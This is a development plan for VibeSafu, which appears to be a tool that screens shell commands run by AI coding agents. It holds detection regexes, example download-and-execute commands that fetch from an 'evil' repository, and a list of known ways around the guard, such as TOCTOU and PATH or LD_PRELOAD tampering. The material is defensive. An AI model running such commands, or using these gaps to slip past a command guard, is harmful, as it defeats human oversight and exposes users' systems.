# VibeSafu Security Improvements Plan

Based on security review in `feedbacks.md`. Goal: Achieve human-developer review level security.

---

## Completed

### 2.3 Git Hooks Security
- [x] Restrict instant-allow to read-only commands only
- [x] Route hook-triggering commands (commit, checkout, merge, etc.) through checkpoint
- **PR**: fix/git-instant-allow-readonly

### 2.1 Two-Step Execution Detection
- [x] Add checkpoint patterns for local script execution
- [x] Shell: sh/bash/zsh script.sh
- [x] Node: node script.js
- [x] Python: python script.py
- [x] Ruby/Perl: ruby script.rb, perl script.pl
- **Branch**: feat/two-step-execution

---

## Phase 1: Pattern-based Improvements (Remaining)

### ~~2.1 Two-Step Execution Detection~~ (DONE)

**Problem**: Download + execute in separate commands bypasses pipe detection
```bash
curl -o install.sh https://example.com/install.sh
bash install.sh  # No pipe, not detected
```

**Solution**: Force ESCALATE for local script execution patterns

**Implementation**:
1. Add to `CHECKPOINT_PATTERNS` (script_execution type):
   ```typescript
   // Local script execution
   { pattern: /\b(bash|sh|zsh)\s+\S+\.sh\b/i, type: 'script_execution', description: 'Running local shell script' },
   { pattern: /\bnode\s+\S+\.js\b/i, type: 'script_execution', description: 'Running local JS script' },
   { pattern: /\bpython[23]?\s+\S+\.py\b/i, type: 'script_execution', description: 'Running local Python script' },
   { pattern: /\bruby\s+\S+\.rb\b/i, type: 'script_execution', description: 'Running local Ruby script' },
   { pattern: /\bperl\s+\S+\.pl\b/i, type: 'script_execution', description: 'Running local Perl script' },
   ```

2. Tests:
   - `bash install.sh` → checkpoint triggered
   - `./script.sh` → checkpoint triggered (already exists)
   - `node setup.js` → checkpoint triggered
   - `python install.py` → checkpoint triggered

**Files**: `src/config/patterns.ts`, `tests/checkpoint.test.ts`

---

### 2.2 Package Manager Install → Force ESCALATE

**Problem**: npm/pip install can run postinstall scripts (supply chain risk)
```bash
npm install malicious-package  # postinstall runs arbitrary code
```

**Current**: Checkpoint detected, but Haiku may SELF_HANDLE for "well-known packages"

**Solution**: Force ESCALATE for all package installs (bypass Haiku SELF_HANDLE)

**Implementation**:
1. Add `forceEscalate` flag to checkpoint types
2. In `haiku-triage.ts`:
   ```typescript
   if (checkpoint.forceEscalate) {
     return { classification: 'ESCALATE', reason: 'Package installation requires Sonnet review' };
   }
   ```

3. Update patterns:
   ```typescript
   { pattern: /npm\s+install/i, type: 'package_install', forceEscalate: true, ... },
   { pattern: /pip\s+install/i, type: 'package_install', forceEscalate: true, ... },
   // etc.
   ```

**Files**: `src/types.ts`, `src/config/patterns.ts`, `src/guard/haiku-triage.ts`, `tests/haiku-triage.test.ts`

---

### 2.4 Trusted Domain ≠ Safe Content

**Problem**: trusted domain downloads can still contain malicious scripts
```bash
curl https://raw.githubusercontent.com/evil/repo/main/malware.sh -o script.sh
```

**Current**: Trusted domain + no pipe → may SELF_HANDLE

**Solution**: Flag risky URL patterns even from trusted domains

**Implementation**:
1. Add `riskyUrlPatterns` check:
   ```typescript
   const RISKY_URL_PATTERNS = [
     /raw\.githubusercontent\.com/i,  // Raw script files
     /releases\/download/i,           // Binary releases
     /\/get\.[^/]+\.sh/i,             // Installer patterns
   ];
   ```

2. In trusted-domain check, if URL matches risky pattern → force ESCALATE

**Files**: `src/guard/trusted-domain.ts`, `src/config/domains.ts`, `tests/trusted-domain.test.ts`

---

## Phase 2: LLM Prompt Improvements

### Sonnet Prompt Enhancement

Add explicit checks in Sonnet review prompt:

```markdown
## Additional Security Checks

1. **Secondary Downloads**: Does this script/command download and execute additional code?
   - Look for: curl|wget inside scripts, eval, bash -c "$(curl ...)"

2. **Privilege Escalation Flow**: Is this part of a dangerous pattern?
   - download → chmod +x → execute → sudo

3. **Dynamic Execution**: Does this use eval, exec, or command substitution with external input?

If ANY of above detected → ASK_USER with specific warning
```

**Files**: `src/guard/sonnet-review.ts`

---

## Phase 3: Documentation

### README Updates

1. Add "Security Model" section explaining:
   - What VibeSafu protects against (pre-execution review)
   - What it does NOT protect against (TOCTOU, runtime attacks)

2. Add "Limitations" section:
   - TOCTOU attacks → recommend sandbox (Docker, firejail)
   - Environment manipulation → recommend isolated environments
   - Multi-stage chains → only 1st level analyzed

**Files**: `README.md`

---

## Out of Scope (Requires Sandbox Layer)

These are documented as limitations, not bugs:

- **TOCTOU**: File changes between analysis and execution
- **Environment attacks**: PATH, LD_PRELOAD, alias manipulation
- **Infinite chain analysis**: 2nd+ level downloads
- **Conditional malware**: Code that behaves differently based on environment

**Recommendation**: For sensitive operations, use Docker/firejail in addition to VibeSafu.

---

## Implementation Order

1. ~~2.3 Git hooks (DONE)~~
2. ~~2.1 Two-step execution (DONE)~~
3. 2.2 Package install force escalate
4. 2.4 Risky URL patterns
5. Sonnet prompt improvements
6. README documentation

---

## Phase 4: UX Improvements

### FSD Mode Streaming

**Problem**: In FSD (full-screen dashboard) mode, ink UI and real-time progress streaming don't work properly.

**TODO**: Investigate and fix:
- [ ] Check if hook output interferes with Claude Code's streaming
- [ ] Test ink components compatibility
- [ ] Ensure progress indicators work in FSD mode

---

## Testing Strategy

Each improvement requires:
1. Failing test first (TDD)
2. Implementation
3. `pnpm verify` pass
4. PR with clear description
